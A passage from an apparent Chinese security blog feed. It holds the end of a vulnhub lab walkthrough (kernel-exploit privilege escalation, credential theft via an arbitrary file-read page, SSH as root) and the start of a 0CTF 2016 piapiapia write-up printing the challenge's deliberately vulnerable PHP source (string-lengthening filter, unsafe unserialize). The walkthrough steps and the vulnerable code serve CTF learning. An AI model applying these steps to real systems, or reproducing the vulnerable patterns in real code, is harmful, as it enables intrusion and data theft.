<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202705.png" /></p>
<p>发现系统内核版本很低，大概率存在内核漏洞。直接使用第一周的exp即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202847.png" /></p>
<p>需要注意的是，对方靶机存在<code>gcc</code>，即可以进行c文件编译。所以直接把c文件传到靶机，编译执行就好。切记别编译完传过去！！！编译环境不同，可能导致无法在对方机子上运行！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203156.png" /></p>
<p>成功提权到root！</p>
<h1 id="渗透-2">渗透-2</h1>
<p>刚刚路径扫描中有一个<code>c</code>文件，直接用<code>test.php</code>读取其中的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203553.png" /></p>
<p>其中 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_connect(ip, username, password, dbname);</span><br></pre></td></tr></table></figure></p>
<p>直接获得了用户名和密码。</p>
<p>路径扫描中还扫描出了<code>/phpmy</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203828.png" /></p>
<p>登录成功！</p>
<p>在表<code>auth</code>中找到用户名和密码。可以从index.php的源码中看到，sql查询语句就是带入这个表查询的，因此直接使用下面的用户名和密码可以直接登录，就不用sql注入了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203922.png" /></p>
<p>登录之后的步骤和[[#SQL注入]]]之后的步骤一样了。</p>
<h1 id="渗透-3">渗透-3</h1>
<h2 id="phpmysql的配置信息">phpmysql的配置信息</h2>
<p>通常用php+MySQL搭建web应用的时候会生成一个网页的管理系统，一般文件为<code>phpmy</code>或者<code>phpmyadmin</code>。</p>
<p>还会生成配置信息文件<code>phpmy/config.inc.php</code>或者<code>phpmyadmin/config.inc.php</code></p>
<h2 id="利用">利用</h2>
<p>再次扫描（每次扫描到新的目录都要接着往下扫描） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.15/phpmy/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204317.png" /></p>
<p>注意红框的两个文件，直接用<code>test.php</code>读取其中的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204443.png" /></p>
<p>又得到了一个用户名和密码，比较特殊的是用户名是<code>root</code>，尝试了一下发现既不是sql注入那的，也不是<code>phpmy</code>的登录信息，忽然想到端口扫描中，22端口开启了ssh服务，故尝试直接连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204734.png" /></p>
<p>直接获得root权限！</p>
<h1 id="总结">总结</h1>
<p>该靶机非常好！！！涉及的攻击技术都非常的常见，并且比较常规。但是就是这些常规的漏洞的组合，却有了很好的表现，比如文件上传和文件包含实现的图片🐎、任意文件读取加上源码审计绕过sql注入、已经强行爆破sql注入等等。值得多次复习！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>图片马</tag>
        <tag>源码审计</tag>
        <tag>任意文件读取</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <url>/2022/04/18/0CTF%202016%20piapiapia/</url>
    <content><![CDATA[<p>靶机地址：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">piapiapia</a></p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境，发现是一个登录界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418160915.png" /></p>
<p>最开始还以为是SQL注入，疯狂得测试，结果一无所获（🤡），实在没结果就尝试路径扫描，结果发现了一个文件<code>www.zip</code>，访问将其下载下来，然后主要是6个php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3.register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4.profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 5.update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span 